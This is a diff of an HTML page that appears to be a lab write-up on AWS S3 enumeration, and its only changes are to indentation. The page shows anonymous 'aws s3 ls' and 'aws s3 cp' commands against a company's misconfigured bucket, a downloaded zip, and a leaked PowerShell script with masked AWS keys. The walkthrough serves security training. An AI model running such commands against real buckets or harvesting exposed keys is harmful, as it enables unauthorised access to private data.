@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>AWS S3 Enumeration Basics — Lab</title>
+    <title>AWS S3 Enumeration Basics — Lab</title>
   <style>
     :root{
       --bg:#0f1724; --card:#0b1220; --muted:#94a3b8; --accent:#7dd3fc;
@@ -83,8 +83,8 @@
       <h3>Browser attempts</h3>
       <p>Examples (not successful here):</p>
       <pre><code>https://s3.amazonaws.com/dev.huge-logistics.com/static/style.css
-https://s3.amazonaws.com/dev.huge-logistics.com/static/
-https://s3.amazonaws.com/dev.huge-logistics.com/</code></pre>
+                  https://s3.amazonaws.com/dev.huge-logistics.com/static/
+                  https://s3.amazonaws.com/dev.huge-logistics.com/</code></pre>
 
       <p>Both of the directory requests above returned access denied in the browser.</p>
 
@@ -101,10 +101,10 @@ https://s3.amazonaws.com/dev.huge-logistics.com/</code></pre>
       <p>The bucket was open to public listing via the CLI, showing directories including <code>shared/</code>, <code>static/</code>, <code>admin/</code> and <code>migration-files/</code>. Recursive listing failed (access denied).</p>
 
       <pre><code>aws s3 ls s3://dev.huge-logistics.com --no-sign-request --recursive
-aws s3 ls s3://dev.huge-logistics.com/admin --no-sign-request
-aws s3 ls s3://dev.huge-logistics.com/migration-files/ --no-sign-request
-aws s3 ls s3://dev.huge-logistics.com/static/ --no-sign-request
-aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request</code></pre>
+                  aws s3 ls s3://dev.huge-logistics.com/admin --no-sign-request
+                  aws s3 ls s3://dev.huge-logistics.com/migration-files/ --no-sign-request
+                  aws s3 ls s3://dev.huge-logistics.com/static/ --no-sign-request
+                  aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request</code></pre>
 
       <p>The <code>shared/</code> directory contained <code>hl_migration_project.zip</code>. Download it:</p>
       <pre><code>aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
@@ -114,9 +114,9 @@ unzip hl_migration_project.zip</code></pre>
 
       <h3>PowerShell snippet (from the leaked script)</h3>
       <pre><code># AWS Configuration
-$accessKey = "A**************U"
-$secretKey = "MwG******************RX/gb9"
-$region = "us-east-1"
+                    $accessKey = "A**************U"
+                    $secretKey = "MwG******************RX/gb9"
+                    $region = "us-east-1"
 
 # Set up AWS hardcoded credentials
 Set-AWSCredentials -AccessKey $accessKey -SecretKey $secretKey
